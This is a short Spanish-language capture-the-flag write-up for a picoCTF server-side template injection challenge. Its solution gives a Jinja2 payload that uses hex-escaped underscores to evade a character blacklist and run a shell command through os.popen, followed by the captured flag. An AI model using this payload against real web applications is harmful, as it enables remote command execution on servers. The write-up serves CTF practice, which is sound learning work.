## Descripción
```
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:61590/)!
```
## Solución
```
Es similar a SSTI1, con la diferencia de que hay una lista negra de determinados caracteres. Basta con utilizar una versión más compleja del SSTI de PayloadAllTheThings, adaptada a nuestro caso.

Solo ingresa: py
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('grep picoCTF . -rnw')|attr('read')()}}

flag: picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}
```

## Notas 
```

```

## Referencias
````

```
